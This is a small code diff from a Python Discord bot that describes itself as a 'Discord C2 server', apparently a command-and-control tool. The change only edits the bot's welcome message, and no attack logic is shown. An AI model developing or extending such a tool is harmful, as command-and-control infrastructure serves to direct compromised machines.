@@ -61,7 +61,7 @@ async def download_file(attachment, save_directory):
 async def on_ready():
     logging.info("Bot is ready and online.")
     channel = bot.get_channel(CHANNEL_ID)
-    await channel.send("✅ Bot is online. Welcome to Discord C2 server created by Deku AKA Piyush")
+    await channel.send("✅ Bot is online. Welcome to Discord C2 server created by Deku")
 
 @bot.event
 async def on_message(message):
